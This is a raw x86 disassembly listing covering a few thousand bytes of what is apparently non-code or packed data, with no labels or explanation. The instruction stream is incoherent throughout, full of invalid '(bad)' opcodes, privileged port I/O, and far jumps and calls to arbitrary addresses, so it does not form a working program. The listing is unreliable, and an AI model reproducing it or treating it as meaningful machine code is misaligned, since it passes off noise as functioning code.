  42360b:	sbb    eax,0x38ac319f
  423610:	ds push ss
  423612:	xchg   ebx,eax
  423613:	test   BYTE PTR [eax],cl
  423615:	outs   dx,BYTE PTR ds:[esi]
  423616:	out    dx,eax
  423617:	or     DWORD PTR [esi],0xaf1cf7d8
  42361d:	jle    0x423645
  42361f:	pusha  
  423620:	jmp    0x83f:0x7b8772a9
  423627:	adc    BYTE PTR [edx],al
  423629:	xchg   esp,eax
  42362a:	sbb    BYTE PTR [edx-0x2208dca7],0x3f
  423631:	pop    ebp
  423632:	shr    bh,0xf8
  423635:	mov    eax,0x6694c1fd
  42363a:	and    dl,bh
  42363c:	std    
  42363d:	pusha  
  42363e:	jmp    0x423611
  423640:	jns    0x423613
  423642:	cdq    
  423643:	mov    dl,BYTE PTR [ecx]
  423645:	and    DWORD PTR [ecx],eax
  423647:	ds data16 mov cl,0xcd
  42364b:	mov    edi,0xb706a719
  423650:	jmp    0xda42:0xb7657717
  423657:	mov    eax,0xbd0e007b
  42365c:	shr    esp,cl
  42365e:	mov    ch,0xd4
  423660:	aas    
  423661:	int3   
  423662:	jmp    0x423697
  423664:	fs sbb ch,al
  423667:	push   ecx
  423668:	pusha  
  423669:	cmc    
  42366a:	jmp    0x5e0e7a09
  42366f:	sti    
  423670:	stc    
  423671:	mov    ch,0x3a
  423673:	call   0x8635:0x6b2fcefb
  42367a:	sbb    DWORD PTR [esi-0xef17f75],edi
  423680:	cmp    DWORD PTR ds:0x26b7c8c9,ebp
  423686:	lea    ebx,[esi-0x342c6cca]
  42368c:	xchg   edx,eax
  42368d:	out    0x2d,al
  42368f:	sbb    DWORD PTR [eax],0xf
  423692:	push   cs
  423693:	pop    es
  423694:	push   cs
  423695:	cmc    
  423696:	cli    
  423697:	fwait
  423698:	sub    BYTE PTR [eax],0x9b
  42369b:	push   edx
  42369c:	lock push 0xca6b532d
  4236a2:	sbb    DWORD PTR [esi],esp
  4236a4:	jmp    0x823c5c99
  4236a9:	fadd   DWORD PTR [esi+0x62]
  4236ac:	test   BYTE PTR [ecx],al
  4236ae:	jo     0x423726
  4236b0:	test   ebp,esi
  4236b2:	mov    esi,0xb31b9de6
  4236b7:	mov    ebx,0x11401927
  4236bc:	xchg   ebx,ebx
  4236be:	add    ch,BYTE PTR [esi+0x71a3265]
  4236c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4236c5:	into   
  4236c6:	mov    ch,0x31
  4236c8:	cmp    eax,0x4240cab3
  4236cd:	(bad)  
  4236ce:	sub    bh,BYTE PTR [ebx+0x1c63c212]
  4236d4:	add    ebx,DWORD PTR [ebx+ecx*1]
  4236d7:	xchg   DWORD PTR [edx+0x7813a6a6],ebp
  4236dd:	lock mov ebx,0xbe4dca9a
  4236e3:	jae    0x42371b
  4236e5:	fdiv   DWORD PTR [eax]
  4236e7:	and    BYTE PTR [ebx+0x2a0ebce4],dl
  4236ed:	fsub   st,st(6)
  4236ef:	jne    0x42371c
  4236f1:	mov    al,0xdc
  4236f3:	imul   ecx,DWORD PTR [edi+0x45],0x47
  4236f7:	push   esi
  4236f8:	jp     0x423703
  4236fa:	and    bl,bh
  4236fc:	fisttp WORD PTR [ecx-0x5b4eb30d]
  423702:	or     DWORD PTR [ecx],edx
  423704:	(bad)  
  423706:	cmp    DWORD PTR [ebx+0x46],ebp
  423709:	mov    bl,0xbf
  42370b:	cld    
  42370c:	pushf  
  42370d:	add    al,cl
  42370f:	imul   edx,DWORD PTR [eax+0x6e],0xffffffeb
  423713:	cli    
  423714:	mov    ebp,0x7970d9d
  423719:	cmp    ebp,ebp
  42371b:	xchg   DWORD PTR [ecx-0x5f9d8509],ebp
  423721:	mov    dl,0xc2
  423723:	adc    al,0xb6
  423725:	jnp    0x42375c
  423727:	fcmovnu st,st(2)
  423729:	cdq    
  42372a:	and    DWORD PTR [esi+0x64],ebx
  42372d:	inc    edi
  42372e:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  423730:	ret    0x33ac
  423733:	das    
  423734:	int3   
  423735:	push   edx
  423736:	adc    dl,cl
  423738:	fs push 0xffffffe3
  42373b:	jbe    0x423728
  42373d:	(bad)  
  42373e:	pop    ecx
  42373f:	icebp  
  423740:	sub    DWORD PTR [ebx],edi
  423742:	push   esi
  423743:	sub    BYTE PTR [ebx+ecx*4],bh
  423746:	ror    BYTE PTR [edi-0x39601563],0x16
  42374d:	push   esp
  42374e:	dec    edi
  42374f:	jb     0x42376a
  423751:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423752:	xchg   esi,eax
  423753:	jle    0x4237a4
  423755:	dec    edx
  423756:	hlt    
  423757:	ds pop ds
  423759:	in     al,dx
  42375a:	or     al,0xd7
  42375c:	jle    0x423740
  42375e:	(bad)  [ebp+0x172f44df]
  423764:	sub    eax,eax
  423766:	imul   esp,DWORD PTR [ebp+0x6c],0x34ebb027
  42376d:	and    eax,0x5abd8bde
  423772:	push   ds
  423773:	imul   esi,esp,0x9093c0b0
  423779:	dec    edi
  42377a:	or     al,0xc7
  42377c:	pop    edi
  42377d:	push   ss
  42377e:	mov    eax,0x5be0e874
  423783:	lods   al,BYTE PTR ds:[esi]
  423784:	jbe    0x4237b0
  423786:	cld    
  423787:	mov    ds,WORD PTR [eax+0x5e]
  42378a:	cmp    ebx,DWORD PTR [esi-0x44]
  42378d:	fcom   QWORD PTR [ebp+0x62]
  423790:	xchg   edx,eax
  423791:	xor    al,0xfe
  423793:	sbb    ch,BYTE PTR [esp+ebx*1+0x33]
  423797:	in     eax,dx
  423798:	popa   
  423799:	js     0x423738
  42379b:	ret    0xff37
  42379e:	(bad)  
  42379f:	dec    esi
  4237a0:	test   DWORD PTR [edx+0x41bde665],esp
  4237a6:	xor    edi,DWORD PTR [esi+0x5a]
  4237a9:	cmp    DWORD PTR [edx-0x73],ecx
  4237ac:	ins    BYTE PTR es:[edi],dx
  4237ad:	sub    DWORD PTR [ebx],0xfffffff0
  4237b0:	cmp    ebp,DWORD PTR [ebp+0x65321227]
  4237b6:	mov    eax,ds:0xd4667ef8
  4237bb:	iret   
  4237bc:	dec    ebp
  4237bd:	pusha  
  4237be:	xchg   esp,eax
  4237bf:	in     al,dx
  4237c0:	dec    ebx
  4237c1:	ret    
  4237c2:	mov    esp,0x9e22cb86
  4237c7:	cli    
  4237c8:	jno    0x42381c
  4237ca:	(bad)  
  4237cc:	or     esp,DWORD PTR [ebp-0x20406cc6]
  4237d2:	repz adc al,0xd4
  4237d5:	fsubrp st(3),st
  4237d7:	pop    eax
  4237d8:	pop    esp
  4237d9:	jbe    0x42384d
  4237db:	retf   
  4237dc:	mov    ebp,0x48876b5a
  4237e1:	xor    dh,BYTE PTR [ebp+0x16451b76]
  4237e7:	clc    
  4237e8:	aad    0x39
  4237ea:	ret    0xc9e2
  4237ed:	mov    ch,0xdc
  4237ef:	rcr    ebp,0x64
  4237f2:	add    bh,0x1c
  4237f5:	mov    dh,0xe
  4237f7:	xchg   edi,eax
  4237f8:	add    BYTE PTR [edx-0x7b],bl
  4237fb:	frstor fs:[ecx-0x1452e8b2]
  423802:	cmp    al,0xa3
  423804:	xchg   esp,eax
  423805:	mov    bl,0x58
  423807:	pop    esi
  423808:	xchg   DWORD PTR [edi-0x55d45c36],esi
  42380e:	fldenv [ecx-0x2b693784]
  423814:	aad    0x85
  423816:	fcomp  st(1)
  423818:	iret   
  423819:	mov    esp,0x2ee0cb1f
  42381e:	aad    0xa3
  423820:	push   0xb
  423822:	mov    DWORD PTR [esi+0x4a],ecx
  423825:	mov    bl,0x38
  423827:	scas   eax,DWORD PTR es:[edi]
  423828:	mov    dh,0xb0
  42382a:	inc    edx
  42382b:	mov    ecx,0x78c5e21
  423830:	mov    bh,0x15
  423832:	std    
  423833:	jmp    0xf9f6:0xd7f5ab47
  42383a:	pop    ebp
  42383b:	push   cs
  42383c:	and    eax,0x7172e304
  423841:	pop    ss
  423842:	fcomp  DWORD PTR ss:[ebx]
  423845:	jae    0x4238b7
  423847:	je     0x4237f9
  423849:	jnp    0x4237e5
  42384b:	cmp    al,0x6b
  42384d:	jp     0x423893
  42384f:	dec    esi
  423850:	cld    
  423851:	xor    BYTE PTR [ebx],dl
  423853:	neg    BYTE PTR [esi-0x2]
  423856:	xchg   ch,al
  423858:	js     0x4238b3
  42385a:	cli    
  42385b:	pop    ds
  42385c:	xchg   esi,eax
  42385d:	dec    eax
  42385e:	rcr    DWORD PTR [edi+ebp*8+0x66],1
  423862:	iret   
  423863:	sar    BYTE PTR [eax],0x34
  423866:	(bad)  
  423867:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  423869:	add    edx,esi
  42386b:	stos   DWORD PTR es:[edi],eax
  42386c:	dec    ebx
  42386d:	add    DWORD PTR [ebx],edi
  42386f:	mov    ch,0x9
  423871:	jmp    0x66cbbe30
  423876:	add    al,0x6b
  423878:	xor    cl,ah
  42387a:	add    eax,0x46994478
  42387f:	jle    0x4238c1
  423881:	sub    DWORD PTR [eax-0x411c67ef],esp
  423887:	repnz cmp DWORD PTR [ecx-0x3d0f9ae],ebx
  42388e:	jmp    0x423904
  423890:	mov    WORD PTR [ecx+0x197457b4],ds
  423896:	std    
  423897:	test   BYTE PTR [ebx],dh
  423899:	dec    ecx
  42389a:	pop    es
  42389b:	pop    esi
  42389c:	cmc    
  42389d:	cmp    al,0x87
  42389f:	xlat   BYTE PTR ds:[ebx]
  4238a0:	rol    edi,cl
  4238a2:	fst    DWORD PTR [ecx]
  4238a4:	xor    dl,BYTE PTR [esi]
  4238a6:	pusha  
  4238a7:	push   0x24
  4238a9:	into   
  4238aa:	or     al,bl
  4238ac:	push   ecx
  4238ad:	adc    ah,bl
  4238af:	je     0x4238b4
  4238b1:	inc    ecx
  4238b2:	dec    esp
  4238b3:	push   edi
  4238b4:	mov    al,0x17
  4238b6:	cmp    al,ch
  4238b8:	sub    edi,DWORD PTR [edi+0x5e]
  4238bb:	(bad)  
  4238bc:	shr    BYTE PTR [ebx+ebx*4+0x379db435],cl
  4238c3:	push   cs
  4238c4:	xor    DWORD PTR [edx],esi
  4238c6:	sub    ah,dh
  4238c8:	or     BYTE PTR [eax+ebx*4],dh
  4238cb:	test   DWORD PTR [eax-0x42],esi
  4238ce:	aaa    
  4238cf:	xchg   edi,eax
  4238d0:	mov    ds:0x6f816fc,eax
  4238d5:	ja     0x4238fe
  4238d7:	add    al,0x3d
  4238d9:	inc    ecx
  4238da:	jecxz  0x423926
  4238dc:	(bad)  
  4238dd:	or     ch,BYTE PTR [ebp+esi*2-0x517b7fc6]
  4238e4:	cld    
  4238e5:	jns    0x42390f
  4238e7:	fadd   st,st(1)
  4238e9:	jnp    0x42390a
  4238eb:	mov    edx,0x62ee155e
  4238f0:	fsub   st,st(4)
  4238f2:	xchg   ebx,eax
  4238f3:	push   ss
  4238f4:	sti    
  4238f5:	out    dx,eax
  4238f6:	call   0x791b92fc
  4238fb:	xchg   DWORD PTR [edx],ebx
  4238fd:	inc    eax
  4238fe:	mov    ebx,0x33f257e3
  423903:	das    
  423904:	pop    ecx
  423905:	and    BYTE PTR [edi+0x0],bl
  423908:	inc    eax
  423909:	xor    al,0xb5
  42390b:	stos   BYTE PTR es:[edi],al
  42390c:	(bad)  [edx]
  42390e:	xor    DWORD PTR [ebx],ebx
  423910:	aaa    
  423911:	into   
  423912:	dec    ebp
  423913:	pop    es
  423914:	lock (bad) 
  423916:	std    
  423917:	add    DWORD PTR [edx],eax
  423919:	loopne 0x423925
  42391b:	lods   eax,DWORD PTR ds:[esi]
  42391c:	pop    es
  42391d:	sub    al,0x35
  42391f:	or     eax,0x191e6308
  423924:	xchg   esi,eax
  423925:	adc    BYTE PTR [edi-0x66],0x27
  423929:	push   ecx
  42392a:	rcr    DWORD PTR [ebx],cl
  42392c:	mov    al,0x17
  42392e:	dec    eax
  42392f:	ss cld 
  423931:	dec    edx
  423932:	mov    ah,0x18
  423934:	test   ecx,edx
  423936:	push   cs
  423937:	xor    BYTE PTR [edx-0x6a],cl
  42393a:	ss ja  0x423995
  42393d:	cmp    DWORD PTR [ecx+ebx*8-0x158c742e],ebp
  423944:	fnstenv [edi]
  423946:	or     al,0x9f
  423948:	stc    
  423949:	or     al,0xe
  42394b:	fist   DWORD PTR [ecx+ebx*8-0x40f80127]
  423952:	fs in  al,0x3a
  423955:	call   0xd6f2f824
  42395a:	aam    0xd8
  42395c:	xlat   BYTE PTR ds:[ebx]
  42395d:	mov    edx,0x4fad736b
  423962:	dec    ebx
  423963:	and    al,BYTE PTR [ebp-0xc]
  423966:	sub    eax,0x1d0cd3c
  42396b:	sub    al,0x82
  42396d:	mov    ah,0x8e
  42396f:	sbb    BYTE PTR [eax],al
  423971:	xor    al,0x3e
  423973:	repnz (bad) 
  423975:	les    ebp,FWORD PTR [edi]
  423977:	xor    ebx,DWORD PTR [esi+0xd]
  42397a:	addr16 aam 0x1f
  42397d:	or     al,0x75
  42397f:	lock xor bh,BYTE PTR [ecx+0x5]
  423983:	xchg   BYTE PTR [esi-0xc8956e9],al
  423989:	cmp    edi,ebx
  42398b:	ins    DWORD PTR es:[edi],dx
  42398c:	cli    
  42398d:	jbe    0x42398e
  42398f:	inc    esi
  423990:	std    
  423991:	outs   dx,DWORD PTR ds:[esi]
  423992:	xchg   ebx,eax
  423993:	popa   
  423994:	icebp  
  423995:	es dec esp
  423997:	jbe    0x42397d
  423999:	sbb    al,0xb2
  42399b:	cmp    ecx,edx
  42399d:	jp     0x4239fe
  42399f:	outs   dx,DWORD PTR ds:[esi]
  4239a0:	pop    ds
  4239a1:	out    0x12,eax
  4239a3:	sub    DWORD PTR [edx+eiz*4+0x12599ae4],0xffffffea
  4239ab:	pop    ebx
  4239ac:	mov    ah,0x1
  4239ae:	outs   dx,BYTE PTR ds:[esi]
  4239af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4239b0:	or     DWORD PTR [edi],edi
  4239b2:	outs   dx,DWORD PTR ds:[esi]
  4239b3:	(bad)  
  4239b4:	jg     0x4239b0
  4239b6:	and    eax,esp
  4239b8:	dec    edi
  4239b9:	addr16 dec eax
  4239bb:	mov    BYTE PTR [ecx-0xa],al
  4239be:	jb     0x423949
  4239c0:	adc    edi,DWORD PTR [ecx-0x77cc2441]
  4239c6:	inc    ebp
  4239c7:	int    0x5a
  4239c9:	addr16 jmp 0x9136:0x53f50336
  4239d1:	or     BYTE PTR [eax],ch
  4239d3:	in     eax,dx
  4239d4:	xchg   edx,eax
  4239d5:	add    dl,BYTE PTR [esp+esi*1]
  4239d8:	in     eax,dx
  4239d9:	arpl   WORD PTR [eax-0x59],dx
  4239dc:	aas    
  4239dd:	mov    ch,0xce
  4239df:	dec    esp
  4239e0:	mov    edi,0x9101749d
  4239e5:	mov    al,ds:0x107caa23
  4239ea:	xchg   edx,eax
  4239eb:	retf   
  4239ec:	or     al,0x42
  4239ee:	faddp  st(6),st
  4239f0:	xchg   edx,eax
  4239f1:	idiv   BYTE PTR [esi+esi*4-0x8480bb8]
  4239f8:	adc    eax,ebp
  4239fa:	call   FWORD PTR [edi]
  4239fc:	mov    cl,0x0
  4239fe:	add    BYTE PTR [eax],al
  423a00:	add    BYTE PTR [eax],al
  423a02:	inc    esi
  423a03:	xchg   edi,eax
  423a04:	daa    
  423a05:	cmp    esi,edi
  423a07:	mov    ebx,0x9b53ff5e
  423a0c:	and    ebx,DWORD PTR [ebp-0x39033db1]
  423a12:	xor    BYTE PTR [ebx+0x4f30001],dh
  423a18:	add    BYTE PTR [eax],al
  423a1a:	pop    esi
  423a1b:	jecxz  0x4239b0
  423a1d:	lods   al,BYTE PTR ds:[esi]
  423a1e:	add    BYTE PTR [ebx-0x6e],bl
  423a21:	(bad)  [ecx+0x77153cbd]
  423a27:	repnz cmc 
  423a29:	js     0x4239af
  423a2b:	jle    0x4239bc
  423a2d:	cld    
  423a2e:	dec    ebp
  423a2f:	mov    al,0x55
  423a31:	sbb    ah,cl
  423a33:	div    BYTE PTR [esi+esi*2]
  423a36:	mov    dh,0x7f
  423a38:	rol    BYTE PTR [ecx-0x6],1
  423a3b:	sbb    edi,ebx
  423a3d:	cwde   
  423a3e:	jbe    0x4239e4
  423a40:	sbb    ebp,DWORD PTR [ebx]
  423a42:	int    0x9a
  423a44:	js     0x423a24
  423a46:	or     ebx,DWORD PTR [ebp+edi*8-0x5ca94d46]
  423a4d:	popf   
  423a4e:	cmp    al,0x60
  423a50:	mov    edx,eax
  423a52:	shl    BYTE PTR [ecx],cl
  423a54:	aaa    
  423a55:	or     eax,0x49407e95
  423a5a:	cmc    
  423a5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423a5c:	fldcw  WORD PTR [esi]
  423a5e:	fidiv  WORD PTR [esi+eax*8-0x4a1d1dde]
  423a65:	popa   
  423a66:	cs mov dl,0xec
  423a69:	bound  edx,QWORD PTR [eax]
  423a6b:	ror    BYTE PTR [eax+0x2c],0xfa
  423a6f:	or     ebx,ebx
  423a71:	test   BYTE PTR [ecx+ebp*8],0x9c
  423a75:	add    BYTE PTR [eax+0x12],cl
  423a78:	into   
  423a79:	adc    BYTE PTR [ebx],dl
  423a7b:	(bad)  
  423a7c:	and    BYTE PTR [eax-0x4f31e9e5],dh
  423a82:	and    edi,DWORD PTR [esi+0x6a]
  423a85:	pop    ebp
  423a86:	ret    0x68f3
  423a89:	inc    ebx
  423a8a:	push   edx
  423a8b:	sub    bl,dh
  423a8d:	pop    ebx
  423a8e:	icebp  
  423a8f:	push   ss
  423a90:	and    edi,DWORD PTR [eax]
  423a92:	loop   0x423a86
  423a94:	and    al,0xc4
  423a96:	scas   al,BYTE PTR es:[edi]
  423a97:	jne    0x423aa3
  423a99:	pop    edi
  423a9a:	cmp    eax,0x2521e6aa
  423a9f:	sub    BYTE PTR [esp+ecx*2+0x5daa5af7],0xd7
  423aa7:	jno    0x423ade
  423aa9:	call   0x7c3c6e96
  423aae:	mov    edi,0x2ddc0444
  423ab3:	sbb    dl,bl
  423ab5:	cmp    eax,0x1317139c
  423aba:	or     al,0xdb
  423abc:	not    BYTE PTR [ebp+0x23]
  423abf:	mov    ebp,0xce2e33c2
  423ac4:	push   ebp
  423ac5:	mov    cl,0xd8
  423ac7:	test   eax,0x4cd701c
  423acc:	ins    DWORD PTR es:[edi],dx
  423acd:	enter  0x5f7c,0x41
  423ad1:	adc    DWORD PTR [ebp+0x3cb6129b],0x3d
  423ad8:	mov    dl,0x81
  423ada:	cli    
  423adb:	test   bl,ch
  423add:	lods   al,BYTE PTR ds:[esi]
  423ade:	out    0x7,al
  423ae0:	(bad)  
  423ae1:	adc    BYTE PTR [ebx],bl
  423ae3:	sahf   
  423ae4:	push   edx
  423ae5:	cs jbe 0x423b62
  423ae8:	mov    ah,0x42
  423aea:	fbld   TBYTE PTR [eax+0x669efaa3]
  423af0:	pop    esi
  423af1:	div    BYTE PTR [esi+0x71]
  423af4:	in     eax,dx
  423af5:	pop    esp
  423af6:	cmp    ebp,DWORD PTR [eax]
  423af8:	add    ebp,DWORD PTR [edi]
  423afa:	push   esp
  423afb:	xchg   esp,eax
  423afc:	inc    ecx
  423afd:	pop    esi
  423aff:	mov    WORD PTR [esi+ebp*8-0x96ae107],es
  423b06:	shr    DWORD PTR [esi-0x7b],1
  423b09:	xor    eax,0x6a599b93
  423b0e:	or     BYTE PTR [eax],bh
  423b10:	into   
  423b11:	and    DWORD PTR [esi-0x37821d4e],esp
  423b17:	daa    
  423b18:	and    ah,BYTE PTR [edx-0x3f]
  423b1b:	adc    eax,0xbe97a86e
  423b20:	xchg   esp,eax
  423b21:	rol    BYTE PTR [ecx-0x15],0x24
  423b25:	pop    ebp
  423b26:	add    al,0x4b
  423b28:	adc    al,BYTE PTR [edi+0x45e1b398]
  423b2e:	adc    BYTE PTR [eax+esi*2+0xa],cl
  423b32:	sbb    al,0x63
  423b34:	into   
  423b35:	inc    esp
  423b36:	mov    WORD PTR [eax-0x63],fs
  423b39:	(bad)  [esi+0x60]
  423b3c:	in     al,dx
  423b3d:	cmp    bl,BYTE PTR [ebx+0x17cffaf5]
  423b43:	clc    
  423b44:	mov    dl,BYTE PTR [edx]
  423b46:	mov    esi,0x3e8ce90f
  423b4b:	xor    al,0xb9
  423b4d:	loopne 0x423b96
  423b4f:	adc    al,0xcc
  423b51:	out    0xc2,al
  423b53:	bound  edi,QWORD PTR [esi+0x24fdaa4c]
  423b59:	je     0x423b98
  423b5b:	xor    cl,BYTE PTR [eax-0x419e80e8]
  423b61:	inc    ecx
  423b62:	pushf  
  423b63:	aaa    
  423b64:	or     cl,cl
  423b66:	retf   
  423b67:	out    0xe8,al
  423b69:	push   eax
  423b6a:	or     eax,0xfa57b08
  423b6f:	rol    DWORD PTR [esi+edi*4+0x7c894aeb],cl
  423b76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b77:	(bad)  
  423b78:	test   ah,ch
  423b7a:	loope  0x423b63
  423b7c:	out    0x9c,eax
  423b7e:	xor    esi,DWORD PTR [eax-0x1a]
  423b81:	fwait
  423b82:	aam    0xd4
  423b84:	push   ebx
  423b85:	jbe    0x423bc8
  423b87:	cmp    al,0x11
  423b89:	bound  esi,QWORD PTR [edx]
  423b8b:	enter  0x8ff8,0xdf
  423b8f:	ror    BYTE PTR [edx+0x48ebb139],1
  423b95:	dec    edi
  423b96:	cmp    al,0xa0
  423b98:	repnz pop esp
  423b9a:	jmp    0x41ca:0x9055bfe9
  423ba1:	mov    al,0x51
  423ba3:	ss call 0xd9dc:0x31ad7e23
  423bab:	ret    0xb375
  423bae:	xchg   esi,eax
  423baf:	cmp    al,0x79
  423bb1:	pop    ecx
  423bb2:	out    dx,al
  423bb3:	es xchg ecx,eax
  423bb5:	sbb    al,0x48
  423bb7:	jmp    0x902b1cb9
  423bbc:	fwait
  423bbd:	out    dx,eax
  423bbe:	das    
  423bbf:	xchg   ebx,edx
  423bc1:	push   edx
  423bc2:	jns    0x423bb0
  423bc4:	ret    
  423bc5:	das    
  423bc6:	addr16 sbb al,0x89
  423bc9:	arpl   WORD PTR [eax-0x7b5d48e6],si
  423bcf:	mov    al,ds:0xb12f069a
  423bd4:	xchg   DWORD PTR [edi-0x2571dfb9],edi
  423bda:	imul   esi,edx,0xffffff96
  423bdd:	mov    esp,0xfb02a3f9
  423be2:	pop    ecx
  423be3:	inc    edi
  423be4:	je     0x423be8
  423be6:	pop    eax
  423be7:	lea    edx,[eax+0x199ba6a8]
  423bed:	out    0xa6,eax
  423bef:	fstp   QWORD PTR [edi-0x30335d]
  423bf5:	fidivr DWORD PTR [ebx+0x37167559]
  423bfb:	lods   eax,DWORD PTR ds:[esi]
  423bfc:	imul   edx,DWORD PTR [esi+0x7db4733e],0x31
  423c03:	sbb    eax,0x57a1cfd2
  423c08:	add    eax,0x27ceca81
  423c0d:	and    ebp,esp
  423c0f:	repnz loope 0x423c8d
  423c12:	push   ecx
  423c13:	sti    
  423c14:	ret    0xf19b
  423c17:	lea    edx,[ebx-0x32cb6f7b]
  423c1d:	retf   
  423c1e:	and    DWORD PTR ds:0xd1137e5,ebx
  423c24:	add    ebx,DWORD PTR [esi]
  423c26:	mov    ah,BYTE PTR [edi+0x15]
  423c29:	test   al,0x66
  423c2b:	jg     0x423be1
  423c2d:	xchg   esp,eax
  423c2e:	adc    DWORD PTR [ecx+ebp*8+0x553fd4db],esi
  423c35:	and    DWORD PTR [ebx+edi*8+0x566c91f8],esp
  423c3c:	(bad)  
  423c3e:	push   0x84b2f2ea
  423c43:	xchg   BYTE PTR [ebp+0x160d2400],dh
  423c49:	in     al,dx
  423c4a:	std    
  423c4b:	stos   BYTE PTR es:[edi],al
  423c4c:	mov    esp,ebx
  423c4e:	mov    ds:0x36603f13,al
  423c53:	(bad)  
  423c54:	icebp  
  423c55:	call   0xa07c1b9b
  423c5a:	fdiv   QWORD PTR [ecx+0x6f]
  423c5d:	adc    ebp,DWORD PTR [ebx-0x134f6b54]
  423c63:	xchg   esp,eax
  423c64:	es int 0x36
  423c67:	sbb    bh,BYTE PTR [ecx]
  423c69:	or     DWORD PTR [edx+eax*4-0x5458e37b],0xffc3789
  423c74:	fwait
  423c75:	loopne 0x423c49
  423c77:	ret    
  423c78:	and    al,0x28
  423c7a:	mov    esi,0x5baf1ec7
  423c7f:	sub    BYTE PTR [ebx],ch
  423c81:	addr16 mov dl,0x81
  423c84:	push   cs
  423c85:	lea    edx,[eax]
  423c87:	adc    al,ah
  423c89:	jl     0x423c5c
  423c8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423c8c:	std    
  423c8d:	xor    ch,BYTE PTR [eax-0x49]
  423c90:	mov    eax,esp
  423c92:	push   esp
  423c93:	outs   dx,BYTE PTR ds:[esi]
  423c94:	int3   
  423c95:	mul    eax
  423c97:	push   edi
  423c98:	ficomp WORD PTR [esp+eiz*2+0x7]
  423c9c:	lock add al,0x3c
  423c9f:	xchg   esi,eax
  423ca0:	jge    0x423c8d
  423ca2:	nop
  423ca3:	icebp  
  423ca4:	(bad)  
  423ca5:	push   edi
  423ca6:	adc    bl,BYTE PTR [ecx+edx*4]
  423ca9:	jmp    0x4d916e0f
  423cae:	xor    BYTE PTR [eax-0x290c5a4c],0x16
  423cb5:	or     eax,0xa557cd73
  423cba:	aad    0x53
  423cbc:	lahf   
  423cbd:	cmp    BYTE PTR [esi-0x22],bl
  423cc0:	or     al,0xc0
  423cc2:	pop    ebx
  423cc3:	lods   al,BYTE PTR ds:[esi]
  423cc4:	iret   
  423cc5:	mov    esi,0x436b6d4
  423cca:	inc    esi
  423ccb:	mov    al,0x9
  423ccd:	retf   0x5dab
  423cd0:	xchg   esp,eax
  423cd1:	dec    eax
  423cd2:	inc    eax
  423cd3:	repnz mov eax,ds:0xd919d0a7
  423cd9:	std    
  423cda:	mov    al,ds:0xa88cde34
  423cdf:	repnz dec ebx
  423ce1:	push   0x7db1687a
  423ce6:	cmp    BYTE PTR [edx],0x53
  423ce9:	sub    al,0x7d
  423ceb:	scas   al,BYTE PTR es:[edi]
  423cec:	xchg   DWORD PTR [edi],eax
  423cee:	xchg   ebx,eax
  423cef:	dec    eax
  423cf0:	inc    ebx
  423cf1:	mov    bh,0x22
  423cf3:	mov    ch,0xef
  423cf5:	test   eax,0x8a9921ca
  423cfa:	xor    DWORD PTR [ecx+0x21982f33],esp
  423d00:	sub    ah,BYTE PTR gs:[ecx-0x199bf0dd]
  423d07:	sahf   
  423d08:	push   edi
  423d09:	inc    ebx
  423d0a:	sbb    eax,0x7eb30c43
  423d0f:	push   cs
  423d10:	jne    0x423d81
  423d12:	xor    eax,0x1c4eb391
  423d17:	out    0x42,eax
  423d19:	mov    esi,0x4c3d7346
  423d1e:	adc    DWORD PTR [ebx-0x7d],0x5c689005
  423d25:	retf   
  423d26:	mov    edi,DWORD PTR [ebx-0x35]
  423d29:	cmp    DWORD PTR [edi+edx*2+0x2b3e91ec],ebx
  423d30:	leave  
  423d31:	jns    0x423d99
  423d33:	dec    ebp
  423d34:	(bad)  
  423d35:	push   ss
  423d36:	xchg   ebp,eax
  423d37:	sbb    ebp,DWORD PTR [ebp+0x4a]
  423d3a:	adc    al,0xc0
  423d3c:	mov    edx,gs
  423d3e:	mov    cl,BYTE PTR [ecx]
  423d40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423d41:	xor    al,0x2
  423d43:	mov    ebx,0x9823ee6e
  423d48:	into   
  423d49:	push   ds
  423d4a:	push   edi
  423d4b:	cdq    
  423d4c:	jecxz  0x423cdf
  423d4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423d4f:	or     BYTE PTR [edi+eiz*4+0x7ed869ac],ch
  423d56:	xor    al,0xcc
  423d58:	enter  0xbb20,0xf1
  423d5c:	outs   dx,DWORD PTR ds:[esi]
  423d5d:	pop    ebx
  423d5e:	call   0xd11b1911
  423d63:	sahf   
  423d64:	pop    edx
  423d65:	iret   
  423d66:	mov    dh,0x4a
  423d68:	xor    DWORD PTR [edi+0x17b4bd5a],eax
  423d6e:	fldcw  WORD PTR [ecx]
  423d70:	jo     0x423d28
  423d72:	call   0x7781:0x477e7ef
  423d79:	enter  0xfa8e,0x63
  423d7d:	jne    0x423d5a
  423d7f:	dec    eax
  423d80:	sub    BYTE PTR [eax],al
  423d82:	aaa    
  423d83:	cld    
  423d84:	inc    ecx
  423d85:	add    bh,BYTE PTR [ebp-0x19]
  423d88:	popa   
  423d89:	adc    BYTE PTR [ecx-0x3ad85249],dh
  423d8f:	rol    esp,1
  423d91:	mov    al,ds:0x4f6045f
  423d96:	leave  
  423d97:	sbb    ebx,ecx
  423d99:	pop    ecx
  423d9a:	pop    ecx
  423d9b:	xor    ah,BYTE PTR [edx+0x48]
  423d9e:	(bad)  
  423d9f:	cmp    DWORD PTR ds:0xb8d26c6c,eax
  423da5:	push   esi
  423da6:	popf   
  423da7:	and    al,BYTE PTR [ebx]
  423da9:	jb     0x423d57
  423dab:	dec    ebp
  423dac:	mov    dl,0x98
  423dae:	mov    ebx,DWORD PTR [esi]
  423db0:	mov    ebx,edi
  423db2:	mov    cl,0xd9
  423db4:	and    dh,BYTE PTR [ebx]
  423db6:	fimul  DWORD PTR [ebx]
  423db8:	lahf   
  423db9:	sub    BYTE PTR [ebx+ebp*2+0x19],0x86
  423dbe:	mov    ecx,0x4d4ea294
  423dc3:	(bad)  
  423dc4:	push   ds
  423dc5:	xlat   BYTE PTR ds:[ebx]
  423dc6:	ja     0x423d7c
  423dc8:	fdiv   st(4),st
  423dca:	out    0x4d,eax
  423dcc:	push   esp
  423dcd:	push   ecx
  423dce:	add    edx,esi
  423dd0:	js     0x423d9e
